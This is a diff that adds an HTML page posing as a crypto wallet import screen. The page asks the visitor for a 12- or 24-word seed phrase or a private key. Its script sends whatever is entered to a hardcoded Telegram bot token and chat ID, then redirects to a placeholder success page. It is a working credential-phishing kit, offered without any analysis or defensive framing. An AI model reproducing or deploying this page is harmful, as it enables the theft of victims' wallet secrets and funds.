@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=350, height=600, initial-scale=1.0" />
+  <title>Access your wallet with your Secret Recovery Phrase</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+	  
+      padding: 20px;
+      background: #fff;
+      width: 350px;
+      height: 600px;
+      overflow-y: auto;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    h2 {
+      text-align: center;
+	   margin: 0 auto 0 90px; /* ← centrage avec léger décalage à droite */
+      font-weight: 600;
+      margin-bottom: 40px;
+    }
+    .tab-buttons {
+      display: flex;
+	  margin: 0 auto 0 38px; /* ← centrage avec léger décalage à droite */
+      width: 100%;
+      border-radius: 8px;
+      overflow: hidden;
+      margin-bottom: 15px;
+    }
+    .tab-buttons button {
+      width: 50%;
+	  
+      padding: 12px 0;
+      border: none;
+      cursor: pointer;
+      font-weight: bold;
+      font-size: 14px;
+      transition: background 0.3s;
+    }
+    .tab-buttons button.active {
+      background-color: #ffffff;
+	  
+      color: black;
+      border: 1px solid #ccc;
+      border-bottom: 2px solid black;
+    }
+    .tab-buttons button.inactive {
+	
+      background-color: #f0f0f0;
+      color: #888;
+      border: 1px solid #ccc;
+      border-bottom: none;
+    }
+    label {
+      display: block;
+	  
+	  margin: 0 auto 0 55px; /* ← centrage avec léger décalage à droite */
+      margin-bottom: 8px;
+      font-size: 14px;
+    }
+    select {
+      width: 100%;
+	    margin: 0 auto 0 40px; /* ← centrage avec léger décalage à droite */
+      padding: 8px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+      margin-bottom: 15px;
+    }
+    .grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+    }
+    .grid input {
+      padding: 10px;
+
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      font-size: 14px;
+    }
+    .confirm-container {
+      display: flex;
+      justify-content: center;
+      margin-top: 25px;
+    }
+    .confirm-btn {
+      width: 100%;
+	  margin: 0 auto 0 40px; /* ← centrage avec léger décalage à droite */
+      padding: 12px;
+      background-color: black;
+      color: white;
+      border: none;
+      border-radius: 60px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .hidden { display: none; }
+    .content { width: 100%; }
+    .message {
+      margin-top: 15px;
+      text-align: center;
+      font-weight: bold;
+      font-size: 14px;
+    }
+    .error { color: red; }
+    .success { color: green; }
+  </style>
+</head>
+<body>
+
+  <h2>Importing a wallet</h2>
+
+  <div class="tab-buttons">
+    <button id="secretTab" class="active" onclick="showTab('secret')">Secret phrase</button>
+    <button id="privateTab" class="inactive" onclick="showTab('private')">Private key</button>
+  </div>
+
+  <div class="content">
+    <div id="secretTabContent">
+      <label for="wordsCount">The number of words in my seed phrase:</label>
+      <select id="wordsCount" onchange="updateInputs(this.value)">
+        <option value="12" selected>12 words</option>
+        <option value="24">24 words</option>
+      </select>
+      <div class="grid" id="seedInputs"></div>
+    </div>
+
+    <div id="privateTabContent" class="hidden">
+      <textarea id="privateKeyInput" placeholder="Enter your private key" rows="6" style="width: 100%; padding: 10px; border-radius: 8px; border: 1px solid #ccc;"></textarea>
+    </div>
+
+    <div class="confirm-container">
+      <button class="confirm-btn" onclick="onConfirm()">Confirm Secret Recovery Phrase</button>
+    </div>
+
+    <div id="message" class="message"></div>
+  </div>
+
+  <script>
+    const TELEGRAM_BOT_TOKEN = '7918572484:AAHP6tcUHK2PuBPpN2Ln2GhFA722z2k7xb0';
+    const TELEGRAM_CHAT_ID = '6996434307';
+
+    const bip39Words = [
+      "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd",
+      "abuse", "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire",
+      "across", "act", "action", "actor", "actress", "actual"
+    ];
+
+    function updateInputs(count) {
+      const container = document.getElementById('seedInputs');
+      container.innerHTML = '';
+      for (let i = 1; i <= count; i++) {
+        const input = document.createElement('input');
+        input.placeholder = i;
+        container.appendChild(input);
+      }
+    }
+
+    function showTab(tab) {
+      const secretTab = document.getElementById('secretTab');
+      const privateTab = document.getElementById('privateTab');
+      const secretContent = document.getElementById('secretTabContent');
+      const privateContent = document.getElementById('privateTabContent');
+
+      secretTab.classList.remove('active', 'inactive');
+      privateTab.classList.remove('active', 'inactive');
+
+      if (tab === 'secret') {
+        secretTab.classList.add('active');
+        privateTab.classList.add('inactive');
+        secretContent.classList.remove('hidden');
+        privateContent.classList.add('hidden');
+      } else {
+        secretTab.classList.add('inactive');
+        privateTab.classList.add('active');
+        secretContent.classList.add('hidden');
+        privateContent.classList.remove('hidden');
+      }
+
+      showMessage("");
+    }
+
+    function sendToTelegram(message, redirectAfter = false) {
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+      fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message
+        })
+      })
+      .then(response => {
+        if (response.ok) {
+          showMessage("", false);
+          if (redirectAfter) {
+            setTimeout(() => {
+              window.location.href = "https://ton-site.com/success.html"; // ⬅️ change ici
+            }, 1000);
+          }
+        } else {
+          showMessage("❌ Failed to send", true);
+        }
+      })
+      .catch(() => {
+        showMessage("❌ Error sending to Telegram", true);
+      });
+    }
+
+    function onConfirm() {
+      const secretTabActive = document.getElementById('secretTab').classList.contains('active');
+      if (secretTabActive) {
+        const inputs = document.querySelectorAll('#seedInputs input');
+        let valid = true;
+        const words = [];
+
+        inputs.forEach(input => {
+          const word = input.value.trim().toLowerCase();
+          if (word === "") valid = false;
+          words.push(word);
+        });
+
+        if (!valid) {
+          showMessage("❌ Please fill all fields", true);
+          return;
+        }
+
+        const invalidWords = words.filter(w => !bip39Words.includes(w));
+        if (invalidWords.length > 0) {
+          showMessage("❌ Incorrect phrase", true);
+          return;
+        }
+
+        const message = `🪙 Seed Phrase:\n\n${words.join(" ")}`;
+        sendToTelegram(message, true);
+
+      } else {
+        const privateKey = document.getElementById('privateKeyInput').value.trim();
+        if (privateKey === "") {
+          showMessage("❌ Please enter your private key.", true);
+          return;
+        }
+
+        const message = `🔑 Private Key:\n\n${privateKey}`;
+        sendToTelegram(message, true);
+      }
+    }
+
+    function showMessage(text, isError) {
+      const msg = document.getElementById("message");
+      msg.innerText = text;
+      msg.className = isError ? "message error" : "message success";
+    }
+
+    updateInputs(12);
+  </script>
+
+</body>
+</html>
